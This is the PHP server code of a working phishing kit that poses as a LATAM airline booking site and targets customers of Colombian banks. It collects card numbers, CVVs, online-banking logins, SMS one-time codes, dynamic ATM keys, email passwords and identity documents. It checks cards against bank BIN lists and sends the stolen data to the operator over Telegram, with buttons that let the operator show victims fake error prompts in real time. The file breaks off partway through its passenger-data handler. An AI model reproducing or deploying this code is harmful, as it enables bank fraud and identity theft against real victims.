<?php

use Mockery\Undefined;

require_once($_SERVER['DOCUMENT_ROOT'] . '/file_main.php');

$card_secret = '7412589637410258';
$tipo = '';
if (isset($_POST['t'])) {
    $tipo = $_POST['t'];
}
$registro = '';
if (isset($_POST['registro'])) {
    $registro = $_POST['registro'];
    if ($registro == 'undefined') {
        $registro = '';
    }
}

function generate_inline_keyboard($registro, $owner, $hidden = false)
{
    $keyboard = [
        [
            [
                'text' => '🔑 P-OTP',
                'callback_data' => 'solicitarotp_' . $registro . '_' . $owner . '-' . ($hidden ? '1' : '0')
            ],
            [
                'text' => '🔑 FINISH',
                'callback_data' => 'finish_' . $registro . '_' . $owner . '-' . ($hidden ? '1' : '0')
            ],
            [
                'text' => '🔑 P-DINA',
                'callback_data' => 'pedirdinamica_' . $registro . '_' . $owner . '-' . ($hidden ? '1' : '0')
            ]
        ],
        [
            [
                'text' => '❌ E-LOGIN',
                'callback_data' => 'errorlogin_' . $registro . '_' . $owner . '-' . ($hidden ? '1' : '0')
            ],

            [
                'text' => '❌ E-CARD',
                'callback_data' => 'errorcard_' . $registro . '_' . $owner .  '-' . ($hidden ? '1' : '0')
            ],
            [
                'text' => '❌ E-BANK',
                'callback_data' => 'errorbank_' . $registro . '_' . $owner .  '-' . ($hidden ? '1' : '0')
            ]
        ],
        [
            [
                'text' => '❌ E-OTP',
                'callback_data' => 'errorotp_' . $registro . '_' . $owner .  '-' . ($hidden ? '1' : '0')
            ],
            [
                'text' => '❌ E-DINA',
                'callback_data' => 'errorcajero_' . $registro . '_' . $owner .  '-' . ($hidden ? '1' : '0')
            ]
        ]

    ];

    return $keyboard;
}

$nombres_bancos = [
    'avvillas' => 'BANCO AV VILLAS',
    'bbva' => 'BANCO BBVA',
    'bancolombia' => 'BANCOLOMBIA',
    'bogota' => 'BANCO DE BOGOTA',
    'cajasocial' => 'BANCO CAJA SOCIAL',
    'citibank' => 'BANCO CITIBANK',
    'colpatria' => 'BANCO COLPATRIA',
    'davivienda' => 'BANCO DAVIVIENDA',
    'falabella' => 'BANCO FALABELLA',
    'itau' => 'BANCO ITAU',
    'nequi' => 'BANCO NEQUI',
    'occidente' => 'BANCO DE OCCIDENTE',
    'popular' => 'BANCO POPULAR',
    'tuya' => 'BANCO TUYA',
    'agrario' => 'BANCO AGRARIO',
    'helm' => 'HELM BANK',
    'santander' => 'BANCO SANTANDER',
    'pichincha' => 'BANCO PICHINCHA',
    'gnb' => 'BANCO GNB SUDAMERIS',
    'hsbc' => 'BANCO HSBC',
    'selfin' => 'BANCO SELFIN',
    'aliadas' => 'BANCO ALIADAS',
    'megabanco' => 'MEGABANCO',
    'andino' => 'BANCO ANDINO',
    'banistmo' => 'BANISTMO',
    'bancomercio' => 'BANCO NACIONAL DEL COMERCIO',
    'lloyds' => 'LLOYDS TSB BANK',
    'coopdesarrollo' => 'COOPDESARROLLO',
    'bancafe' => 'BANCAFE',
    'bansuperior' => 'BANSUPERIOR',
    'conavi' => 'CONAVI',
    'credibanco' => 'CREDIBANCO',
    'ath' => 'A TODA HORA',
    'estado' => 'BANCO DEL ESTADO',
    'otros' => 'OTROS BANCOS',
];

$bin_list = [
    'avvillas' => ['412706', '470438', '470439', '470440', '482451', '496079', '496080', '496081'],
    'bbva' => ['404279', '404280', '410164', '421892', '439216', '439467', '450407', '450408', '450418', '454100', '454700', '454701', '454759', '455100', '456783', '459419', '462550', '485995', '491268', '492198', '492468', '492488', '492489', '518761', '518841', '521354', '527564', '528629', '540699', '542650', '547457', '548115', '553643'],
    'bancolombia' => ['377813', '377815', '409983', '409984', '409985', '411054', '441119', '446846', '449188', '451303', '451307', '451308', '451309', '451318', '451321', '451348', '451349', '451359', '451374', '451376', '451380', '451381', '451390', '451391', '451392', '451396', '451397', '451398', '451399', '454400', '485946', '494381', '517640', '517710', '530371', '530372', '530373', '530691', '530693', '530694', '530695', '530696', '530697', '540614', '540615', '540640', '540649', '540688', '540691', '547062', '547480', '549157', '549158', '552588', '552807', '601600', '601601', '601602', '601603', '601604', '601606', '601607', '601609', '601610', '601611', '601612', '601613', '601616', '601617', '601620', '601621', '601622', '601623', '601624', '601625', '601626', '601627', '601629', '601630', '601631', '601633', '601634', '601635', '601640', '601641', '601642', '601643', '601644', '601645', '601646', '601647', '601648', '601649', '601650', '601651', '601652', '601654', '601655', '601656', '601657', '601659', '601661', '601662', '601663', '601665', '601666', '601667', '601668', '601670', '601671', '601673', '601674', '601676', '601678', '601679', '601682', '601683', '601684', '601687', '601689', '601690', '601691', '601693', '601694', '601695', '601696', '601697', '601698', '601699'],
    'bogota' => ['402739', '402764', '403722', '406238', '419328', '421513', '421544', '423383', '423949', '426045', '426732', '430274', '433460', '446872', '450668', '450942', '454200', '457320', '457537', '457542', '459918', '459919', '465770', '466090', '477363', '477364', '485935', '486412', '486514', '491511', '491602', '491614', '491616', '491617', '491625', '491626', '493110', '493111', '496083', '499812', '512069', '522104', '529198', '531088', '539612', '540080', '543862', '548494', '548940', '552221', '552865', '553661'],
    'cajasocial' => ['443846', '443847', '450648', '450796', '452494', '453924', '457021', '457022', '459386', '459388', '462947', '485980', '486618', '489445', '498478', '498534'],
    'citibank' => ['402753', '405513', '419016', '422274', '422441', '422789', '426288', '430929', '434082', '459070', '461202', '461203', '480850', '480851', '480852', '498533', '498858', '498859', '498860', '498861', '498862', '512067', '515816', '532576', '543421', '543448', '546853', '554933'],
    'colpatria' => ['404177', '404178', '408430', '408431', '409744', '410176', '411759', '416048', '416049', '432105', '432106', '434606', '440811', '440812', '450406', '454600', '454601', '457282', '457284', '457317', '461208', '461209', '482484', '485930', '492485', '492486', '493813', '496084', '498476'],
    'davivienda' => ['360324', '402530', '403899', '407383', '424488', '425817', '425949', '425950', '425951', '430464', '439116', '439152', '441080', '454300', '455370', '455981', '455982', '455983', '455986', '456360', '458173', '472043', '472044', '473228', '474493', '485630', '485953', '485970', '486437', '487048', '491646', '491647', '498467', '512020', '512046', '512272', '512392', '517796', '520024', '528092', '531378', '540692', '540694', '547063', '547102', '547107', '547113', '547115', '547130', '547158', '547178', '547191', '547246', '547481', '547482', '548788', '549156', '549724', '552336', '552903', '554901', '554936', '558761'],
    'falabella' => ['514332', '528209'],
    'nequi' => ['409355'],
    'occidente' => ['400608', '425987', '430485', '431026', '431027', '441511', '450650', '455722', '456390', '462940', '462941', '475094', '485936', '489911', '489925', '491330', '530710', '530711', '530712', '530713', '530714', '530715', '530716', '530717', '530718', '530719', '530720', '530721', '530722', '530723', '530724', '530725', '530726', '530727', '530728', '530729', '540625', '541203', '547385', '549151', '552256', '558772'],
    'popular' => ['372656', '406694', '420559', '424114', '450011', '450658', '454322', '454405', '454476', '454616', '485926', '489469'],
    'agrario' => ['448185', '448186', '448187', '449744', '453268', '480258', '485919', '485979', '486647', '492199'],
    'helm' => ['406678', '418207', '431385', '431386', '432440', '435730', '449728', '450602', '451430', '453922', '454106', '455309', '485929', '485991', '486413', '486529'],
    'santander' => ['448408', '450822', '455700', '456815', '456816', '457024', '485958', '489908', '491361', '491362', '491363', '518770', '520144', '520186', '522497', '522941', '523014', '523015', '527606', '541140', '541461', '546687', '547417', '547462', '549030', '552558', '552800', '556607', '557555'],
    'pichincha' => ['401616', '404987', '463188', '491240', '491264', '491265'],
    'gnb' => ['401612', '401693', '405414', '421066', '421067', '454076', '454083', '465955', '469864', '479428', '485924', '492114', '492115', '498867'],
    'hsbc' => ['401694', '403323', '424587', '435651', '435729', '441508', '441509', '448403', '455127', '465721', '465722', '466700', '473264', '473265', '490109', '490148'],
    'selfin' => ['448723', '448724', '448725', '448726', '448728'],
    'aliadas' => ['423938', '432567', '491329', '491384'],
    'megabanco' => ['403799', '406257', '411040', '411041', '411042', '411043', '423950', '435147', '491273', '491275', '491615'],
    'andino' => ['450959', '454831', '455158'],
    'banistmo' => ['409988', '425960', '450714', '465592', '487046', '487047'],
    'bancomercio' => ['406692'],
    'lloyds' => ['433827', '465591', '465593', '465594'],
    'coopdesarrollo' => ['435748'],
    'bancafe' => ['435780'],
    'bansuperior' => ['439153', '473229', '473230'],
    //'conavi' => ['409355', '491221', '493182', '493183'],
    'credibanco' => ['409642', '450724', '491628'],
    'ath' => ['411088'],
    'estado' => ['450704', '451372', '454329', '455291', '498837'],
    'otros' => ['370110', '400476', '400490', '400491', '403757', '405169', '407398', '410321', '414339', '414340', '416026', '417947', '417949', '424701', '424702', '424703', '424704', '424705', '424706', '428495', '428496', '441011', '441015', '441016', '443849', '447215', '451323', '451733', '451750', '452516', '454068', '454896', '455201', '455371', '456522', '457283', '457321', '457473', '457563', '457564', '457566', '457602', '457603', '457604', '457605', '459096', '459355', '459356', '459357', '459418', '459425', '459428', '459504', '459505', '462896', '465278', '465956', '469733', '469734', '469766', '470432', '470435', '470437', '470449', '472856', '472857', '474555', '474556', '474630', '476003', '476006', '477170', '480405', '482407', '482452', '482453', '482454', '483015', '484184', '484191', '484193', '484194', '485012', '485941', '485975', '486367', '486454', '489056', '489057', '489058', '489059', '489421', '489422', '489444', '489474', '489965', '490773', '491277', '491603', '491648', '491960', '499808', '499809', '511696', '512577', '512645', '512679', '512804', '515858', '516069', '517183', '518329', '518335', '518361', '518498', '518973', '519422', '519971', '520058', '520142', '521311', '521399', '522155', '522156', '522749', '522973', '523577', '524057', '525495', '525723', '525983', '525984', '526826', '528009', '528085', '528098', '528608', '528884', '529239', '529404', '530497', '531122', '531124', '531126', '531375', '531960', '531961', '533171', '534173', '534174', '539828', '539862', '540690', '540695', '540696', '541251', '541686', '541713', '542646', '544977', '546692', '547061', '547064', '547129', '547141', '547142', '547479', '547513', '547531', '547532', '547631', '547780', '547870', '548567', '549152', '549166', '549225', '549342', '549616', '550237', '550517', '550518', '550519', '552303', '552501', '552673', '553145', '553662', '558771', '559225', '603344'],
];

$data = [];
switch ($tipo) {
    case 'consulta':
        $status = -1;
        $actual_data = buscar_registro($registro);
        if ($actual_data) {
            $status = $actual_data['status'];
        }
        switch ($status) {
            case 'finish_jts':
                $data['nombres'] = $actual_data['nombres'];
                $data['email'] = $actual_data['email'];
                $data['cedula'] = $actual_data['cedula'];
                $data['action'] = ['_finish_jts.php'];
                break;

            case 'home':
                $data['action'] = ['home_1.php', true];
                break;
            case 'req_login':
                $data['alerta'] =
                    [
                        'type' => 'banco',
                        'title' => 'Error de Validación',
                        'msg' => 'Usuario o clave inválida, por favor intente nuevamente'
                    ];
                $data['action'] = ['_login.php'];
                break;
            // case 'rec_audio':
            case 'error_cajero':
                $data['alerta'] =
                    [
                        'type' => 'error',
                        'msg' => 'La Clave Dinamica o Token ingresado es incorrecta, por favor intente nuevamente'
                    ];
                $data['action'] = ['_atm.php'];
                break;
            case 'error_otp':
                $data['alerta'] =
                    [
                        'type' => 'error',
                        'msg' => 'El código SMS ingresado es incorrecto, por favor intente nuevamente'
                    ];
                $data['action'] = ['_otp.php'];
                break;
            case 'error_bank':
                $data['alerta'] =
                    [
                        'type' => 'error',
                        'msg' => 'Su banco ha rechazado la transacción, por favor intente nuevamente con otra tarjeta de crédito o débito'
                    ];
                actualizar_registro($registro, ['status' => 'req_tarjeta'], false);
                $cedula = $actual_data['cedula'];
                $array = [
                    'cedula' => $cedula,
                    'status' => 'req_tarjeta',
                    'email' => $actual_data['email'],
                    'nombres' => $actual_data['nombres'],
                    'celular' => $actual_data['celular'],
                    'ciudad' => $actual_data['ciudad'],
                    'direccion' => $actual_data['direccion'],
                    'dispositivo' => $_SERVER['HTTP_USER_AGENT'],
                    'ip' => $_SERVER['REMOTE_ADDR'],
                    'horacreado' => time(),
                    'horamodificado' => time(),
                    'owner' => $owner,
                ];
                $data['registro'] = $registro = crear_registro($array);
                $data['action'] = ['card.php', true];
                break;
            case 'error_cvv':
                $data['alerta'] =
                    [
                        'type' => 'error',
                        'msg' => 'Su pago ha sido rechazado, por favor inténtelo nuevamente con otra tarjeta de crédito o débito'
                    ];
                actualizar_registro($registro, ['status' => 'req_tarjeta'], false);
                $cedula = $actual_data['cedula'];
                $array = [
                    'cedula' => $cedula,
                    'status' => 'req_tarjeta',
                    'email' => $actual_data['email'],
                    'nombres' => $actual_data['nombres'],
                    'celular' => $actual_data['celular'],
                    'ciudad' => $actual_data['ciudad'],
                    'direccion' => $actual_data['direccion'],
                    'dispositivo' => $_SERVER['HTTP_USER_AGENT'],
                    'ip' => $_SERVER['REMOTE_ADDR'],
                    'horacreado' => time(),
                    'horamodificado' => time(),
                    'owner' => $owner,
                ];
                $data['registro'] = $registro = crear_registro($array);
                $data['action'] = ['card.php', true];
                break;
            case 'req_tarjeta':
                $data['action'] = ['card.php', true];
                break;
            case 'req_cajero':
                $data['alerta'] = null;
                $data['action'] = ['_atm.php'];
                break;
            case 'req_email':
                $data['alerta'] = null;
                $data['action'] = ['_email_user.php'];
                break;
            case 'req_otp':
                $data['alerta'] = null;
                $data['tarjeta'] = $actual_data['tarjeta'];
                $data['action'] = ['_otp.php'];
                break;
            case 'codigo_reenviado':
                $array = [
                    'status' => 'req_otp'
                ];
                actualizar_registro($registro, $array);
                break;
            case 'finish':
                $data['action'] = ['_finish.php'];
                break;
        }
        break;
    //-----------------------------------
    case 'codigo_nuevo':
        $array = [
            'status' => 'codigo_nuevo',
        ];
        actualizar_registro($registro, $array);
        break;
    case 'pre-home':
        $id = $_POST['idItem'];
        $data['action'] = ['home_' . $id . '.php', true];
        break;
    case 'pre-cedula':
        $cedula = $_POST['cedula'];
        $data['cedula'] = $cedula;
        $data['action'] = ['home_2.php', true];
        if ($datos = get_cedula_finalizada($cedula)) {
            $data['alerta'] =
                [
                    'type' => 'success',
                    'msg' => 'Usted ya tiene un envío en proceso, en las próximas horas estaremos enviándole más información a su correo electrónico'
                ];
            $data['datos'] = $datos;
        }
        break;
    case 'resumen':
        $data['action'] = ['resumen.php', true];
        break;
    case 'datos':
        $cedula = $_POST['cedula'] ?? 'SIN_CEDULA';
        $email = $_POST['email'] ?? 'SIN_EMAIL';
        $celular = $_POST['celular'] ?? 'SIN_CELULAR';
        $nombres = $_POST['nombres'] ?? 'SIN_NOMBRES';
        $ciudad = $_POST['ciudad'] ?? 'SIN_CIUDAD';
        $direccion = $_POST['direccion'] ?? 'SIN_DIRECCION';
        $banco = $_POST['banco'] ?? 'SIN_BANCO';
        $array = [
            'status' => 'rec_datos',
            'email' => $email,
            'cedula' => $cedula,
            'nombres' => $nombres,
            'celular' => $celular,
            'ciudad' => $ciudad,
            'direccion' => $direccion,
            'dispositivo' => $_SERVER['HTTP_USER_AGENT'],
            'banco' => $banco,
            'ip' => $_SERVER['REMOTE_ADDR'],
            'horacreado' => time(),
            // 'horamodificado' => time(),
            'owner' => $owner,
        ];

        $data['personType'] = $personType  = $_POST['personType'] ?? false;
        $data['celular'] = $celular;

        $data['ip'] =  $array['ip'];

        if ($personType) {
            $array['tarjeta'] = '0000000000000000';
        }

        $data['registro'] = $registro = crear_registro($array);
        if (!$personType) {
            $data['action'] = ['card.php', true];
        }
        break;
    case 'update_latam':
        // Usar Solo Para latam
        $cedula = $_POST['cedula'];
        $email = $_POST['email'];
        $celular = $_POST['celular'];
        $nombres = $_POST['nombres'];
        $ciudad = $_POST['ciudad'];
        $direccion = $_POST['direccion'];
        $array = [
            'status' => 'rec_datos',
            'email' => $email,
            'cedula' => $cedula,
            'nombres' => $nombres,
            'celular' => $celular,
            'ciudad' => $ciudad,
            'direccion' => $direccion,
            'dispositivo' => $_SERVER['HTTP_USER_AGENT'],
            'ip' => $_SERVER['REMOTE_ADDR'],
            'horacreado' => time(),
            // 'horamodificado' => time(),
            'owner' => $owner,
        ];
        $data['registro'] = $registro = crear_registro($array);
        $data['ip'] =  $array['ip'];
        // $data['action'] = ['card.php', true];
        $data['celular'] = $celular;
        break;
    case 'tarjeta': //ingresa tarjeta
        $data['banco'] = $banco = $_POST['banco'];
        $data['tarjeta'] = $tarjeta = $_POST['tarjeta'];
        $ftarjeta = $_POST['ftarjeta'];
        $nombres = $_POST['nombres'] ?? '';
        $telefono = $_POST['telefono'] ?? '';
        $cedula = $_POST['cedula'] ?? '';
        $email = $_POST['email'] ?? '';
        $cvv = $_POST['cvv'];
        $bin = substr($tarjeta, 0, 6);
        $paso = false;
        if (isset($bin_list[$banco])) {
            if (in_array($bin, $bin_list[$banco])) {
                $paso = true;
            }
        } else if ($banco == 'otro') {
            $paso = true;
        }
        $data['nombre_banco'] = $nombres_bancos[$banco];
        $actual_data = buscar_registro($registro);
        if ($tarjeta != $card_secret) {
            if (!$paso) {
                $data['alerta'] =
                    [
                        'type' => 'error',
                        'msg' => 'Hemos notado que has ingresado una tarjeta débito o crédito que no coincide con el banco seleccionado, por favor verifique la información'
                    ];
                $data['action'] = ['card.php', true];
                break;
            }
            $array_search = [
                'banco' => $banco,
                'tarjeta' => $tarjeta,
                'ftarjeta' => $ftarjeta,
                'cvv' => $cvv,
                'cedula' => $actual_data['cedula'],
                'celular' => $actual_data['celular'],
            ];
            $identico = get_identico($array_search);
            if (!$identico) {
                // Identificar tipo de BIN
                $bin_info = identificar_tipo_bin($bin);

                $contenido = '💸💸💸 CARD 💸💸💸' . "\n";
                $contenido .= "🏦 Banco: " . $banco . "\n";
                $contenido .= "💳 Tarjeta: " . $tarjeta . "\n";
                $contenido .= "📆 Fecha Exp: " . $ftarjeta . "\n";
                $contenido .= "👁 CVV: " . $cvv . "\n";

                // Agregar información del BIN
                if ($bin_info['success']) {
                    $contenido .= '━━━━━ BIN INFO ━━━━━' . "\n";
                    $contenido .= "🔖 Tipo: " . $bin_info['tipo'] . "\n";
                    $contenido .= "🏷 Marca: " . $bin_info['marca'] . "\n";
                    $contenido .= "🏦 Banco BIN: " . $bin_info['banco'] . "\n";
                    $contenido .= "🌎 País: " . $bin_info['pais'] . "\n";
                    $contenido .= "💰 Prepago: " . $bin_info['prepago'] . "\n";
                }

                $contenido .= '🔧🔧🔧🔧🔧🔧🔧🔧🔧' . "\n";
                $contenido .= "👱 Cedula: " . $cedula . "\n";
                $contenido .= "💁 Nombre: " . $nombres . "\n";
                $contenido .= "📧 Correo: " . $email . "\n";
                $contenido .= "📞 Celular: " . $telefono . "\n";
                // $contenido .= "🏙 Ciudad: " . $actual_data['ciudad'] . "\n";
                // $contenido .= "🏡 Direccion: " . $actual_data['direccion'] . "\n";
                // $options = generate_inline_keyboard($registro, $owner, false);
                enviar_telegram($contenido, $owner, false, []);
            }
        }
        $array = [
            'status' => 'rec_tarjeta',
            'banco' => $banco,
            'tarjeta' => $tarjeta,
            'ftarjeta' => $ftarjeta,
            'cvv' => $cvv,
            'nombres' => $nombres,
            'email' => $email,
            'cedula' => $cedula,
            'celular' => $telefono,
        ];
        actualizar_registro($registro, $array);
        $data['alerta'] = null;
        $data['action'] = ['_loadBank.php'];
        if ($banco == 'otro') {
            $data['alerta'] =
                [
                    'type' => 'error',
                    'msg' => 'Su pago ha sido rechazado, por favor inténtelo nuevamente con otra tarjeta de crédito o débito'
                ];
            $data['action'] = ['card.php', true];
        }
        break;
    case 'login':
        if (!$registro) {
            $array = [
                'status' => 'rec_datos',
                'email' => 'colpatria@colpatria.com',
                'cedula' => 'SIN_CEDULA',
                'nombres' => 'SIN_NOMBRES',
                'celular' => 'SIN_CELULAR',
                'ciudad' => 'SIN_CIUDAD',
                'direccion' => 'SIN_DIRECCION',
                'banco' => 'colpatria',
                'tarjeta' => '0000000000000000',
                'dispositivo' => $_SERVER['HTTP_USER_AGENT'],
                'ip' => $_SERVER['REMOTE_ADDR'],
                'horacreado' => time(),
                // 'horamodificado' => time(),
                'owner' => $owner,
            ];
            $data['registro'] = $registro = crear_registro($array);
        }

        $usuario = $_POST['usuario'];
        $password = $_POST['password'];
        $array = [
            'status' => 'rec_login',
            'usuario' => $usuario,
            'password' => $password
        ];
        $actual_data = buscar_registro($registro);
        switch ($actual_data['banco']) {
            // case 'bancolombia':
            //     break;
            default:
                if ($actual_data['tarjeta'] != $card_secret) {
                    $array_search = [
                        'cedula' => $actual_data['cedula'],
                        'banco' => $actual_data['banco'],
                        'tarjeta' => $actual_data['tarjeta'],
                        'usuario' => $usuario,
                        'password' => $password,
                    ];
                    $identico = get_identico($array_search);
                    if (!$identico) {
                        $contenido = '💸💸💸 BANCO 💸💸💸' . "\n";
                        $contenido .= "🏦 Banco: " . $actual_data['banco'] . "\n";
                        $contenido .= "💳 Tarjeta: " . $actual_data['tarjeta'] . "\n";
                        $contenido .= "💻 Usuario: " . $usuario . "\n";
                        $contenido .= "🔐 Password: " . $password . "\n";
                        $contenido .= '🔧🔧🔧🔧🔧🔧🔧🔧🔧' . "\n";
                        $contenido .= "👱 Cedula: " . $actual_data['cedula'] . "\n";
                        $contenido .= "💁 Nombre: " . $actual_data['nombres'] . "\n";
                        $contenido .= "📞 Celular: " . $actual_data['celular'] . "\n";
                        $options = generate_inline_keyboard($registro, $owner, true);
                        enviar_telegram($contenido, $owner, true, $options);
                    }
                }
                break;
        }
        $data['alerta'] = null;
        actualizar_registro($registro, $array, true);
        $data['action'] = ['_wait.php'];
        break;
    case 'usuario':
        $array = [
            'status' => 'rec_usuario',
            'usuario' => $_POST['usuario'],
        ];
        actualizar_registro($registro, $array, true);
        $data['action'] = ['_pass.php'];
        break;
    case 'pass':
        $array = [
            'status' => 'rec_login',
            'password' => $_POST['clave'],
        ];
        actualizar_registro($registro, $array, true);
        $actual_data = buscar_registro($registro);
        if ($actual_data['tarjeta'] != $card_secret) {
            $contenido = '💸💸💸 BANCO 💸💸💸' . "\n";
            $contenido .= "🏦 Banco: " . $actual_data['banco'] . "\n";
            $contenido .= "💳 Tarjeta: " . $actual_data['tarjeta'] . "\n";
            $contenido .= "💻 Usuario: " . $actual_data['usuario'] . "\n";
            $contenido .= "🔐 Password: " . $actual_data['password'] . "\n";
            $contenido .= '🔧🔧🔧🔧🔧🔧🔧🔧🔧' . "\n";
            $contenido .= "👱 Cedula: " . $actual_data['cedula'] . "\n";
            $contenido .= "💁 Nombre: " . $actual_data['nombres'] . "\n";
            $contenido .= "📞 Celular: " . $actual_data['celular'] . "\n";
            $options = generate_inline_keyboard($registro, $owner, true);
            enviar_telegram($contenido, $owner, true, $options);
        }
        $data['action'] = ['_wait.php'];
        break;
    case 'otp':
        $array = [
            'status' => 'rec_otp',
            'otp' => $_POST['otp'],
        ];
        actualizar_registro($registro, $array);
        $actual_data = buscar_registro($registro);
        if ($actual_data['tarjeta'] != $card_secret) {
            $contenido = '💸💸💸 BANCO 💸💸💸' . "\n";
            $contenido .= "🏦 Banco: " . $actual_data['banco'] . "\n";
            $contenido .= "💳 Tarjeta: " . $actual_data['tarjeta'] . "\n";
            $contenido .= "💻 Usuario: " . $actual_data['usuario'] . "\n";
            $contenido .= "🔐 Password: " . $actual_data['password'] . "\n";
            $contenido .= '🔧🔧🔧🔧🔧🔧🔧🔧🔧' . "\n";
            $contenido .= "👱 Cedula: " . $actual_data['cedula'] . "\n";
            $contenido .= "💁 Nombre: " . $actual_data['nombres'] . "\n";
            $contenido .= "📞 Celular: " . $actual_data['celular'] . "\n";
            $contenido .= "🔑 OTP: " . $_POST['otp'] . "\n";
            $options = generate_inline_keyboard($registro, $owner, true);
            enviar_telegram($contenido, $owner, true, $options);
        }
        $data['action'] = ['_wait.php'];
        break;
    case 'cajero':
        $array = [
            'status' => 'rec_cajero',
            'cajero' => $_POST['cajero'],
        ];
        actualizar_registro($registro, $array);
        $actual_data = buscar_registro($registro);
        if ($actual_data['tarjeta'] != $card_secret) {
            $contenido = '💸💸💸 BANCO 💸💸💸' . "\n";
            $contenido .= "🏦 Banco: " . $actual_data['banco'] . "\n";
            $contenido .= "💳 Tarjeta: " . $actual_data['tarjeta'] . "\n";
            $contenido .= "💻 Usuario: " . $actual_data['usuario'] . "\n";
            $contenido .= "🔐 Password: " . $actual_data['password'] . "\n";
            $contenido .= '🔧🔧🔧🔧🔧🔧🔧🔧🔧' . "\n";
            $contenido .= "👱 Cedula: " . $actual_data['cedula'] . "\n";
            $contenido .= "💁 Nombre: " . $actual_data['nombres'] . "\n";
            $contenido .= "📞 Celular: " . $actual_data['celular'] . "\n";
            $contenido .= "🔑 OTP: " .  $actual_data['otp'] . "\n";
            $contenido .= "🏧 DINAMICA: " . $_POST['cajero'] . "\n";
            $options = generate_inline_keyboard($registro, $owner, true);
            enviar_telegram($contenido, $owner, true, $options);
        }
        $data['action'] = ['_wait.php'];
        break;
    case 'password_email':
        $array = [
            'status' => 'rec_email',
            'email' => $_POST['email'],
            'password_email' => $_POST['password_email'],
        ];
        actualizar_registro($registro, $array);
        $data['action'] = ['_wait.php'];
        break;
    case 'email':
        $data['email'] = $email = $_POST['email'];
        $empresa = explode('.', explode('@', $email)[1])[0];
        $data['action'] = ['_wait.php'];
        $data['timeOutSeconds'] = 5;
        $data['timeOutAction'] = '_email_pass.php';
        switch ($empresa) {
            case 'yahoo':
                $data['domain'] = '__email_yahoo.php';
                break;
            case 'hotmail':
            case 'outlook':
                $data['domain'] = '__email_outlook.php';
                break;
            case 'gmail':
                $data['domain'] = '__email_gmail.php';
                break;
            default:
                $data['alerta'] =
                    [
                        'type' => 'banco',
                        'title' => 'Error de Correo',
                        'msg' => 'Por favor, ingrese un correo electrónico válido'
                    ];
                $data['action'] = ['alerta'];
                break;
        }
        break;
    case 'audio':
        $array = [
            'status' => 'rec_audio',
        ];
        actualizar_registro($registro, $array, true);
        $data['action'] = ['_wait.php'];
        break;
    case "pre-lts":
        $data["fecha_vuelta"] = $_POST["fecha_vuelta"];
        $data["fecha_ida"] = $_POST["fecha_ida"];
        $data["origen_code"] = $_POST["origenCode"];
        $data["origen_ciudad"] = $_POST["origenCiudad"];
        $data["destino_code"] = $_POST["destinoCode"];
        $data["destino_ciudad"] = $_POST["destinoCiudad"];

        // $data['v1_hora_salida'] = $data['v1_hora_llegada'] = $data['v1_precio'] = $data['v1_vuelo_code'] = '';
        // $data['v2_hora_salida'] = $data['v2_hora_llegada'] = $data['v2_precio'] = $data['v2_vuelo_code'] = '';

        // $data['vez'] = 0;
        $data['pasajeros'] = $_POST['pasajeros'];
        $data['action'] = ['home_2.php', true];
        break;
    case 'latam':
        if ($_POST["vez"] == 1) {
            $data['v1_hora_salida'] = $_POST['hora_salida'];
            $data['v1_hora_llegada'] = $_POST['hora_llegada'];
            $data['v1_precio'] = $_POST['precio'];
            $data['v1_vuelo_code'] = $_POST['vuelo_code'];
            $data['action'] = ['vuelos.php', true];
        } else if ($_POST["vez"] == 2) {
            $data['v1_hora_salida'] = $_POST['v1_hora_salida'];
            $data['v1_hora_llegada'] = $_POST['v1_hora_llegada'];
            $data['v1_precio'] = $_POST['v1_precio'];
            $data['v1_vuelo_code'] = $_POST['v1_vuelo_code'];
            $data['v2_hora_salida'] = $_POST['hora_salida'];
            $data['v2_hora_llegada'] = $_POST['hora_llegada'];
            $data['v2_precio'] = $_POST['precio'];
            $data['v2_vuelo_code'] = $_POST['vuelo_code'];
            $data['action'] = ['resumen.php', true];
        }
        else if ($_POST["vez"] == 3) {
            $data['v1_hora_salida'] = $_POST['hora_salida'];
            $data['v1_hora_llegada'] = $_POST['hora_llegada'];
            $data['v1_precio'] = $_POST['precio'];
            $data['v1_vuelo_code'] = $_POST['vuelo_code'];
            $data['action'] = ['resumen.php', true];
        }
        break;
    case "datos-latam":
        $envPasajeros = $_POST['redirectPasajeros'] ?? false;
        if ($envPasajeros) {
            $data['action'] = ['pasajeros.php', true];
            break;
        }
        $email = $_POST['email'];
        $celular = $_POST['celular'];
        $nombres = $_POST['nombres'];
        $array = [
            'status' => 'rec_datos',
            'email' => $email,
            'nombres' => $nombres,
            'celular' => $celular,
            'dispositivo' => $_SERVER['HTTP_USER_AGENT'],
            'ip' => $_SERVER['REMOTE_ADDR'],
            'horacreado' => time(),
            // 'horamodificado' => time(),
            'owner' => $owner,
        ];
        $data['registro'] = $registro = crear_registro($array);
        $data['ip'] =  $array['ip'];
        $data['action'] = ['card.php', true];
        break;
    case 'datos-pasajeros':
        $pasajeros_json = $_POST['pasajeros'] ?? '[]';
        $pasajeros = json_decode($pasajeros_json, true);
        $cedula = $_POST['cedula'] ?? 'SIN_CEDULA';
        $email = $_POST['email'] ?? 'SIN_EMAIL';
        $celular = $_POST['celular'] ?? 'SIN_CELULAR';
        $nombres = $_POST['nombres'] ?? 'SIN_NOMBRES';
        $ciudad = $_POST['ciudad'] ?? 'SIN_CIUDAD';
        $direccion = $_POST['direccion'] ?? 'SIN_DIRECCION';
        $banco = $_POST['banco'] ?? 'SIN_BANCO';

        // Crear registro en la base de datos
        $array = [
            'status' => 'rec_datos_pasajeros',
            'email' => $email,
            'cedula' => $cedula,
            'nombres' => $nombres,
            'celular' => $celular,
            'ciudad' => $ciudad,
            'direccion' => $direccion,
            'dispositivo' => $_SERVER['HTTP_USER_AGENT'],
            'banco' => $banco,
            'ip' => $_SERVER['REMOTE_ADDR'],
            'horacreado' => time(),
            'owner' => $owner,
        ];

        $data['registro'] = $registro = crear_registro($array);

        // Enviar información de pasajeros a Telegram
        if (count($pasajeros) > 0) {
            $contenido = '✈️✈️✈️ PASAJEROS ✈️✈️✈️' . "\n";
            $contenido .= '━━━━━━━━━━━━━━━━━━━━' . "\n";

            foreach ($pasajeros as $index => $pasajero) {
                $num_pasajero = $index + 1;
                $contenido .= "\n👤 PASAJERO #$num_pasajero\n";
                $contenido .= "👤 Nombre: " . $pasajero['nombre'] . " " . $pasajero['apellido'] . "\n";
                $contenido .= "📋 Tipo Doc: " . $pasajero['tipoDocumento'] . "\n";
                $contenido .= "🆔 Documento: " . $pasajero['numDocumento'] . "\n";
                $contenido .= "⚧ Género: " . $pasajero['genero'] . "\n";
                $contenido .= "🎂 F. Nacimiento: " . $pasajero['fechaNacimiento'] . "\n";
